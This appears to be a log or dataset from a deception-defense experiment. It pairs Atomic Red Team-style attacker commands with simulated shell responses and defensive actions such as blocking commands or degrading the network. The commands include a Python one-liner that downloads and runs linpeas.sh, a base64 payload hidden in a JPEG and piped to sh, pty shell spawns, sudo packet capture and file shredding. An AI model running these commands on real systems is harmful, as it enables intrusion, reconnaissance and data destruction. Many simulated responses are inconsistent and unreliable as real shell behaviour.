+response:-bash: sh: command not found
+chris@speedlab-ml-3:~$
+tactic:1
+technique:10
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:pip install requests
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:112
+
+
+action:{ if output is file content, Change the file content }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:$which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
+response:chris@speedlab-ml-3:~$
+tactic:6
+technique:29
+
+
+action:{ Block this command this time }
+command:cat /etc/shells 
+response:-bash: cat: command not found
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:pip install requests    
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output content access right relative, change the access rights }
+command:echo 'import requests' > T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Change terminal output this time }
+command:echo 'import os' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:echo 'url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh"' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output is file content, Change the file content }
+command:echo 'malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles"' >> T1059.006.py
+response:chris@speedlab-ml-3:~$
+action:{ if output contain hardware setting, Change hardware setting }
+command:whoami
+response:chris
+tactic:1
+technique:165
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:pip install requests
+response:Defaulting to user installation because normal site-packages is not writeable
+Collecting requests
+  Downloading requests-2.26.0-py2.py3-none-any.whl (62 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 62 kB 3.8 MB/s 
+Collecting urllib3<1.27,>=1.21.1
+  Downloading urllib3-1.26.6-py2.py3-none-any.whl (138 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 138 kB 3.4 MB/s 
+Collecting idna<3,>=2.5
+  Downloading idna-2.10-py2.py3-none-any.whl (58 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 58 kB 1.2 MB/s 
+Collecting chardet<5,>=3.0.2
+  Downloading chardet-4.0.0-py2.py3-none-any.whl (178 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 178 kB 1.5 MB/s 
+Installing collected packages: urllib3, idna, chardet, requests
+Successfully installed chardet-4.0.0 idna-2.10 requests-2.26.0 urllib3-1.26.6
+
+chris@speedlab-ml-3:~$
+tactic:4
+technique:29
+
+
+action:{ Change terminal output this time }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:/bin/python3
+
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:$which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
+response:Error: Network speed degraded. Unable to fetch the remote resource.
+
+chris@speedlab-ml-3:~$
+tactic:5
+technique:50
+
+
+action:{ Block this command this time }
+command:cat "/home/atomics/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "/home/atomics/image.jpg" - > "/home/atomics/evil_image.jpg"; strings "/home/atomics/evil_image.jpg" | tail -n 1 | base64 -d | sh
+response:zsh: command not found
+
+chris@speedlab-ml-3:~$
+tactic:2
+technique:9
+
+
+action:{ Block this command this time }
+command:pip install requests
+response:ERROR: Could not find a version that satisfies the requirement requests (from versions: none)
+ERROR: No matching distribution found.
+
+chris@speedlab-ml-3:~$
+action:{ if output contain hardware setting, Change hardware setting }
+command:whoami
+response:chris
+tactic:9
+technique:175
+
+
+action:{ if output content access right relative, change the access rights }
+command:uname -srm
+response:Linux 5.4.0-42-generic x86_64
+tactic:1
+technique:165
+
+
+action:{ if output is file content, Change the file content }
+command:pip install requests
+response:Defaulting to user installation because normal site-packages is not writeable
+Collecting requests
+  Downloading requests-2.25.1-py2.py3-none-any.whl (61 kB)
+Collecting urllib3<1.27,>=1.21.1
+  Downloading urllib3-1.26.5-py2.py3-none-any.whl (137 kB)
+Collecting idna<3,>=2.5
+  Downloading idna-2.10-py2.py3-none-any.whl (59 kB)
+Collecting chardet<5,>=3.0.2
+  Downloading chardet-4.0.0-py2.py3-none-any.whl (178 kB)
+Installing collected packages: urllib3, idna, chardet, requests
+Successfully installed chardet-4.0.0 idna-2.10 requests-2.25.1 urllib3-1.26.5
+chris@speedlab-ml-3:~$
+tactic:4
+technique:29
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:chris@speedlab-ml-3:~$
+tactic:3
+technique:29
+
+
+action:
+command:$which_python -c "import pty;pty.spawn('/bin/sh')"
+response:chris@speedlab-ml-3:~$
+tactic:3
+technique:163
+
+
+action:{ Block this command this time }
+command:exit
+response:chris@speedlab-ml-3:~$
+tactic:3
+technique:29
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:$which_python -c "import pty;pty.spawn('/bin/bash')"
+response:chris@speedlab-ml-3:~$
+tactic:4
+technique:2
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:exit
+response:chris@speedlab-ml-3:~$
+tactic:4
+technique:103
+
+
+action:{ Change terminal output this time }
+command:pip install requests
+response:ERROR: Could not find a version that satisfies the requirement requests
+ERROR: No matching distribution found for requests
+chris@speedlab-ml-3:~$
+tactic:4
+technique:29
+
+
+action:{ if output content access right relative, change the access rights }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Restore to original state }
+command:$which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
+response:chris@speedlab-ml-3:~$
+action:{ Block this command this time }
+command:whoami
+response:bash: whoami: command not found
+chris@speedlab-ml-3:~$ 
+action:{ if output contain network speed, Degrade the network speed }
+command:whoami
+response:chris
+tactic:1
+technique:68
+
+
+action:{ Change terminal output this time }
+command:[ "$(uname)" = 'FreeBSD' ] && alias python3=python3.9
+response:bash: syntax error near unexpected token `&&'
+tactic:8
+technique:1
+
+
+action:{ Block this command this time }
+command:if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
+response:bash: command not found: if
+action:{ if output contain hardware setting, Change hardware setting }
+command:whoami
+response:chris
+tactic:1
+technique:38
+
+
+action:{ if output is upload or download, Block this command by the network traffic }
+command:cp /bin/ls /tmp/evil-binary
+response:cp: cannot stat '/bin/ls': No such file or directory
+chris@speedlab-ml-3:~$
+tactic:1
+technique:128
+
+
+action:{ if output is file content, Change the file content }
+command:truncate -s +1 /tmp/evil-binary #adds a byte to the file size
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:131
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:cat "/home/atomics/script.sh" | base64 | xxd -p | sed 's/../& /g' | xargs -n1 | xxd -r -p | cat "/home/atomics/image.jpg" - > "/home/atomics/evil_image.jpg"; strings "/home/atomics/evil_image.jpg" | tail -n 1 | base64 -d | sh
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:99
+
+
+action:{ if output contain network speed, Degrade the network speed }
+command:pip install requests
+response:Defaulting to user installation because normal site-packages is not writeable
+Collecting requests
+  Downloading requests-2.26.0-py2.py3-none-any.whl (63 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 63 kB 3.0 MB/s 
+Collecting certifi>=2017.4.17
+  Downloading certifi-2021.10.8-py3-none-any.whl (151 kB)
+     |¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i¢i| 151 kB 4.0 MB/s 
+Collecting charset-normalizer~=2.0.0
+  Downloading charset_normalizer-2.0.7-py3-none-any.whl (38 kB)
+Collecting idna<4,>=2.5
+  Downloading idna-3.3-py3-none-any.whl (61 kB)
+Collecting urllib3<1.27,>=1.21.1
+  Downloading urllib3-1.26.7-py2.py3-none-any.whl (138 kB)
+Collecting typing-extensions; python_version < "3.10"
+  Downloading typing_extensions-3.10.0.2-py3-none-any.whl (22 kB)
+Installing collected packages: certifi, charset-normalizer, idna, urllib3, requests, typing-extensions
+Successfully installed certifi-2021.10.8 charset-normalizer-2.0.7 idna-3.3 requests-2.26.0 urllib3-1.26.7 typing-extensions-3.10.0.2
+chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ Block this command this time }
+command:which_python=$(which python || which python3 || which python3.9 || which python2)
+response:chris@speedlab-ml-3:~$
+tactic:1
+technique:29
+
+
+action:{ if output contain hardware setting, Change hardware setting }
+command:$which_python -c 'import requests;import os;url = "https://github.com/carlospolop/PEASS-ng/releases/download/20220214/linpeas.sh";malicious_command = "sh T1059.006-payload -q -o SysI, Devs, AvaSof, ProCronSrvcsTmrsSocks, Net, UsrI, SofI, IntFiles";session = requests.session();source = session.get(url).content;fd = open("T1059.006-payload", "wb+");fd.write(source);fd.close();os.system(malicious_command)'
+response:chris@speedlab-ml-3:~$
+action:{ Block this command this time }
+command:whoami
+response:chris@speedlab-ml-3:~$ 
+tactic:11
+technique:125
+
+
+action:{ if output is file content, Change the file content }
+command:cc /home/atomics/T1040/src/linux_pcapdemo.c -o /tmp/t1040_linux_pcapdemo
+response:chris@speedlab-ml-3:~$ 
+tactic:1
+technique:125
+
+
+action:{ Restore to original state }
+command:sudo /tmp/t1040_linux_pcapdemo -a -t 3
+response:chris@speedlab-ml-3:~$ 
+tactic:11
+technique:103
+
+
+action:
+command:touch /tmp/victim-shred.txt
+response:chris@speedlab-ml-3:~$ 
+tactic:1
+technique:103
+
+
+action:{ Block this command this time }
+command:shred -u /tmp/victim-shred.txt
+response:chris@speedlab-ml-3:~$ 
+action:{ Block this command this time }
+command:whoami
+response:chris@speedlab-ml-3:~$ 
+tactic:1
+technique:165
+
+
+action:{ if output is file content, Change the file content }
+command:sudo apt install make
+response:Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+The following additional packages will be installed:
+  make-df
+The following NEW packages will be installed:
+  make make-df
+0 upgraded, 2 newly installed, 0 to remove and 0 not upgraded.
+Need to get 561 kB of archives.
+After this operation, 2,176 kB of additional disk space will be used.
+Do you want to continue? [Y/n] y
+Get:1 http://archive.ubuntu.com/ubuntu focal/universe amd64 make amd64 4.2.1-1.2ubuntu2 [134 kB]
+Get:2 http://archive.ubuntu.com/ubuntu focal/universe amd64 make-df amd64 4.2.1-1.2ubuntu2 [427 kB]
+Fetched 561 kB in 1s (743 kB/s)
+Selecting previously unselected package make.
+(Reading database ... 192000 files and directories currently installed.)
+Preparing to unpack .../make_4.2.1-1.2ubuntu2_amd64.deb ...
+Unpacking make (4.2.1-1.2ubuntu2) ...
+Selecting previously unselected package make-df.
+Preparing to unpack .../make-df_4.2.1-1.2ubuntu2_amd64.deb ...
+Unpacking make-df (4.2.1-1.2ubuntu2) ...
+Setting up make (4.2.1-1.2ubuntu2) ...
+Setting up make-df (4.2.1-1.2ubuntu2) ...
+Processing triggers for libc-bin (2.31-0ubuntu9.9) ...
+chris@speedlab-ml-3:~$ 
+tactic:1
+technique:200
+
+
